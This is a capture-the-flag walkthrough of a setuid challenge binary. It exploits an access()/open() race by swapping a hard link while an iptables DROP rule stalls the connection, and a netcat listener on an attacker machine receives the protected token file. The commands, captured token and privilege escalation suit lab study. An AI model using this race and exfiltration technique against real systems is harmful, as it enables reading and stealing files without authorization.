## Challenge
The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.

## Solution
```c
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc < 3) {
      printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
      exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      printf("Connecting to %s:18211 .. ", host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
          printf("Unable to connect to host %s\n", host);
          exit(EXIT_FAILURE);
      }

#define HITHERE ".oO Oo.\n"
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf("Unable to write banner to host %s\n", host);
          exit(EXIT_FAILURE);
      }
#undef HITHERE

      printf("Connected!\nSending file .. "); fflush(stdout);

      ffd = open(file, O_RDONLY);
      if(ffd == -1) {
          printf("Damn. Unable to open file\n");
          exit(EXIT_FAILURE);
      }

      rc = read(ffd, buffer, sizeof(buffer));
      if(rc == -1) {
          printf("Unable to read from file: %s\n", strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf("wrote file!\n");

  } else {
      printf("You don't have access to %s\n", file);
  }
}
```
```console
level10@nebula:/home/flag10$ ls -l
total 9
-rwsr-x--- 1 flag10 level10 7743 2011-11-20 21:22 flag10
-rw------- 1 flag10 flag10    37 2011-11-20 21:22 token
```
Okay, let's read about the `access` system call.
```console
man 2 access
```
```
NAME
       access - check real user's permissions for a file

SYNOPSIS
       #include <unistd.h>

       int access(const char *pathname, int mode);

DESCRIPTION
       access()  checks whether the calling process can access the file pathname.  If path‐
       name is a symbolic link, it is dereferenced.

       The mode specifies the accessibility check(s) to be performed,  and  is  either  the
       value F_OK, or a mask consisting of the bitwise OR of one or more of R_OK, W_OK, and
       X_OK.  F_OK tests for the existence of the file.  R_OK, W_OK, and X_OK test  whether
       the file exists and grants read, write, and execute permissions, respectively.

       The  check  is  done  using  the calling process's real UID and GID, rather than the
       effective IDs as is done when actually attempting an operation  (e.g.,  open(2))  on
       the  file.  This allows set-user-ID programs to easily determine the invoking user's
       authority.

       If the calling process is privileged (i.e., its real UID  is  zero),  then  an  X_OK
       check  is  successful for a regular file if execute permission is enabled for any of
       the file owner, group, or other.

RETURN VALUE
       On success (all requested permissions granted), zero  is  returned.   On  error  (at
       least  one  bit  in  mode asked for a permission that is denied, or some other error
       occurred), -1 is returned, and errno is set appropriately.
```
There's going to be a problem here, `flag10` checks for `R_OK` read access but `access` checks against the `real UID`.

`setuid` sets the `effective UID`, thus we will fail the check when entering `token` as the `file`.

But the `man` article has more to say:
```
NOTES
       Warning: Using access() to check if a user is authorized to,  for  example,  open  a
       file  before  actually  doing  so using open(2) creates a security hole, because the
       user might exploit the short time interval between checking and opening the file  to
       manipulate it.  For this reason, the use of this system call should be avoided.
```
Jackpot?

We can make `file` a `hard link` and change it accordingly:
* `access()` - point to a file created by `level10`
* `open()` - point to `token`

Since we initiate the connection to `host` after calling `access()` we can stall the process to buy us time for swapping our link file.

For this I am going to use a second machine to act as the receiving end of the `token`.

### The Plan
Create dummy file with `level10` permissions.
```console
level10@nebula:~$ echo hello > /home/level10/test
```
Create link file and link it to dummy file.
```console
level10@nebula:~$ ln -fT /home/level10/test /home/level10/tkn
```
Listen for incoming connection on attacker machine at predefined port `18211`.
```console
┌──(kali㉿kali)-[~]
└─$ nc -lvp 18211
listening on [any] 18211 ...
```
Create `iptables` rule to drop connections from victim machine.

Notice the usage of `DROP` in contrast to `REJECT`.
* `REJECT` - replies with `RST`, rejects the connection
* `DROP` - drops the packets with no reply

We want `DROP` because we need to stall the connection phase.

This will force the victim machine to retransmit the `SYN` packet and wait till `timeout`.
```console
┌──(root💀kali)-[/home/kali]
└─# iptables -A INPUT -s 192.168.157.3 -j DROP
```
Run `flag10` with link as `file` and attacker machine as `host`.
```console
level10@nebula:/home/flag10$ ./flag10 /home/level10/tkn 192.168.157.4
Connecting to 192.168.157.4:18211 .. 
```
While the victim machine tries connecting, we know we passed the `access()` test.

So we can swap the link
```console
level10@nebula:~$ ln -fT /home/flag10/token tkn
```
and remove the `iptables` rule.
```console
┌──(root💀kali)-[/home/kali]
└─# iptables -L INPUT
Chain INPUT (policy ACCEPT)
target     prot opt source               destination
DROP       all  --  192.168.157.3        anywhere

┌──(root💀kali)-[/home/kali]
└─# iptables -D INPUT 1
```
After the connection is made, `open()` is called with `token` as the file our link points to.
```console
...
Connected!
Sending file .. wrote file!
```
```console
192.168.157.3: inverse host lookup failed: Host name lookup failure
connect to [192.168.157.4] from (UNKNOWN) [192.168.157.3] 37391
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
```
Use the `token` to login as `flag10` and `getflag`!
```console
level10@nebula:/home/flag10$ su flag10
Password:
sh-4.2$ getflag
You have successfully executed getflag on a target account
```
